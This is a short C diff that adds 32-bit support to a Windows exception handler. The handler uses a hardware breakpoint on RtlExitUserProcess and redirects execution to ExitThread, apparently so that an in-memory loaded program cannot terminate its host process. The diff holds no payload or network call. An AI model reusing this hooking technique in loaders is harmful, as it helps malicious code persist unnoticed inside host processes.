@@ -435,13 +435,26 @@ LONG WINAPI handlerRtlExitUserProcess(EXCEPTION_POINTERS * ExceptionInfo)
     if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) 
     {
         BYTE* baseAddress = (BYTE*)xGetProcAddress(xGetLibAddress((PCHAR)"ntdll.dll", TRUE, NULL), (PCHAR)"RtlExitUserProcess", 0);
+#ifdef _WIN64
         if (ExceptionInfo->ContextRecord->Rip == (DWORD64) baseAddress) 
         {            
             // continue the execution
             ExceptionInfo->ContextRecord->EFlags |= (1 << 16);            // set RF (Resume Flag) to continue execution
             //ExceptionInfo->ContextRecord->Rip++;                        // or skip the breakpoint via instruction pointer
             ExceptionInfo->ContextRecord->Rip = (DWORD64)GetProcAddress(GetModuleHandle("Kernel32.dll"), "ExitThread");
-        }        
+        }  
+#else   // ===================== X86 =======================   
+        if (ExceptionInfo->ContextRecord->Eip == (DWORD)baseAddress)
+        {
+            // Set Resume Flag
+            ExceptionInfo->ContextRecord->EFlags |= (1 << 16);
+
+            // Redirect execution to ExitThread
+            ExceptionInfo->ContextRecord->Eip =
+                (DWORD)GetProcAddress(GetModuleHandleA("kernel32.dll"), "ExitThread");
+        }
+
+#endif
         return EXCEPTION_CONTINUE_EXECUTION;
     }
     return EXCEPTION_CONTINUE_SEARCH;
